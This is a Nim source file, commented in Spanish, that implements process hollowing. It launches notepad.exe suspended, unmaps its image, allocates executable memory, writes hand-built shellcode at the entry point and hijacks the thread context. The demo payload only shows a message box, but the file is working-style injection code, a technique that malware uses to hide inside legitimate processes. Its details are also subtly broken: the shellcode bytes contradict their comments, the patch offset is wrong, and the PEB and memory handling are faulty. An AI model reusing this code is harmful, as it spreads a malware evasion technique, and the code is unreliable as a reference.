import winim
import winim/lean

# Payload: MessageBoxA (64-bit)
# MessageBoxA(NULL, "Hollow Process", "Nim Injection", MB_OK)
let payload: array[0..75, byte] = [
    byte 0x48, 0x83, 0xEC, 0x28,             # sub rsp, 28h
    byte 0x48, 0x31, 0xC9,                   # xor rcx, rcx
    byte 0x48, 0xB9, 0x48, 0x6F, 0x6C, 0x6C, # mov rcx, "Hollow Process"
             0x6F, 0x77, 0x20, 0x50, 
             0x72, 0x6F, 0x63, 0x65, 
             0x73, 0x73, 0x00, 0x00,
    byte 0x48, 0xBA, 0x4E, 0x69, 0x6D, 0x20, # mov rdx, "Nim Injection"
             0x49, 0x6E, 0x6A, 0x65, 
             0x63, 0x74, 0x69, 0x6F, 
             0x6E, 0x00, 0x00, 0x00,
    byte 0x49, 0xB8, 0x30, 0x00, 0x00, 0x00, # mov r8, 30h (MB_OK)
    byte 0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, # mov r9, 0
    byte 0xFF, 0x15, 0x02, 0x00, 0x00, 0x00, # call [rel MessageBoxA]
    byte 0xEB, 0x08,                         # jmp $+8
    byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # MessageBoxA address
    byte 0x48, 0x83, 0xC4, 0x28,             # add rsp, 28h
    byte 0xC3                                # ret
]

proc resolveApi(hProcess: HANDLE, dllName: string, apiName: string): PVOID =
    var hModule = LoadLibraryA(dllName)
    if hModule == 0:
        return nil
    
    var apiAddr = GetProcAddress(hModule, apiName)
    if apiAddr == nil:
        return nil
    
    # Calculate the relative address for the call
    result = cast[PVOID](cast[uint64](apiAddr))

proc main() =
    echo "[+] Iniciando Process Hollowing en Nim"
    
    # Paso 1: Crear proceso suspendido (notepad)
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    ZeroMemory(addr si, sizeof(si))
    ZeroMemory(addr pi, sizeof(pi))
    si.cb = sizeof(si).cint
    
    let success = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        nil,
        nil,
        nil,
        FALSE,
        CREATE_SUSPENDED,
        nil,
        nil,
        addr si,
        addr pi
    )
    
    if not success:
        echo "[-] Error creando proceso: ", GetLastError()
        return
    
    echo "[+] Proceso notepad creado (PID: ", pi.dwProcessId, ")"
    
    # Paso 2: Obtener contexto del hilo y dirección base de la imagen
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    if GetThreadContext(pi.hThread, addr ctx) == 0:
        echo "[-] Error obteniendo contexto: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    # Leer PEB para obtener dirección base de la imagen
    var peb: PEB
    var bytesRead: SIZE_T
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](ctx.Rdx + 0x10), addr peb, sizeof(peb), addr bytesRead) == 0:
        echo "[-] Error leyendo PEB: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    let imageBase = cast[PVOID](peb.ImageBaseAddress)
    echo "[+] Dirección base de la imagen: ", cast[int](imageBase)
    
    # Paso 3: Leer headers PE para obtener EntryPoint
    var dosHeader: IMAGE_DOS_HEADER
    if ReadProcessMemory(pi.hProcess, imageBase, addr dosHeader, sizeof(dosHeader), addr bytesRead) == 0:
        echo "[-] Error leyendo DOS header: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    if dosHeader.e_magic != IMAGE_DOS_SIGNATURE:
        echo "[-] DOS header inválido"
        TerminateProcess(pi.hProcess, 0)
        return
    
    let ntHeadersOffset = dosHeader.e_lfanew
    var ntHeaders: IMAGE_NT_HEADERS64
    if ReadProcessMemory(pi.hProcess, cast[LPCVOID](cast[uint64](imageBase) + ntHeadersOffset.uint64), 
                         addr ntHeaders, sizeof(ntHeaders), addr bytesRead) == 0:
        echo "[-] Error leyendo NT headers: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    if ntHeaders.Signature != IMAGE_NT_SIGNATURE:
        echo "[-] NT headers inválidos"
        TerminateProcess(pi.hProcess, 0)
        return
    
    let entryPoint = cast[uint64](imageBase) + ntHeaders.OptionalHeader.AddressOfEntryPoint
    echo "[+] EntryPoint original: 0x", toHex(cast[int](entryPoint))
    
    # Paso 4: Unmap de la imagen original
    let ntdll = LoadLibraryA("ntdll.dll")
    let zwUnmapViewOfSection = cast[proc(hProcess: HANDLE, BaseAddress: PVOID): NTSTATUS {.stdcall.}](
        GetProcAddress(ntdll, "NtUnmapViewOfSection")
    )
    
    if zwUnmapViewOfSection(pi.hProcess, imageBase) != 0:
        echo "[-] Error unmapping sección: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    echo "[+] Imagen original unmappeada"
    
    # Paso 5: Allocar memoria en la misma dirección base
    let size = ntHeaders.OptionalHeader.SizeOfImage
    let newImageBase = VirtualAllocEx(
        pi.hProcess,
        imageBase,
        size,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if newImageBase == nil:
        echo "[-] Error allocando memoria: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    echo "[+] Memoria allocada en: ", cast[int](newImageBase)
    
    # Paso 6: Resolver dirección de MessageBoxA
    let messageBoxAddr = resolveApi(pi.hProcess, "user32.dll", "MessageBoxA")
    if messageBoxAddr == nil:
        echo "[-] Error resolviendo MessageBoxA"
        TerminateProcess(pi.hProcess, 0)
        return
    
    echo "[+] MessageBoxA encontrada en: ", cast[int](messageBoxAddr)
    
    # Paso 7: Preparar payload con dirección real de MessageBoxA
    var finalPayload = payload
    # Escribir dirección de MessageBoxA en el payload (offset 33)
    copyMem(addr finalPayload[33], addr messageBoxAddr, sizeof(messageBoxAddr))
    
    # Paso 8: Escribir payload en memoria
    if WriteProcessMemory(pi.hProcess, cast[LPVOID](entryPoint), addr finalPayload[0], 
                         finalPayload.len, addr bytesRead) == 0:
        echo "[-] Error escribiendo payload: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    echo "[+] Payload escrito en memoria (", bytesRead, " bytes)"
    
    # Paso 9: Setear contexto para apuntar al payload
    ctx.Rip = entryPoint
    if SetThreadContext(pi.hThread, addr ctx) == 0:
        echo "[-] Error seteando contexto: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    echo "[+] Contexto modificado para apuntar al payload"
    
    # Paso 10: Resumir proceso
    if ResumeThread(pi.hThread) == -1:
        echo "[-] Error resumiendo hilo: ", GetLastError()
        TerminateProcess(pi.hProcess, 0)
        return
    
    echo "[+] Proceso resumido - Injection completada!"
    
    # Limpiar
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)

when isMainModule:
    main()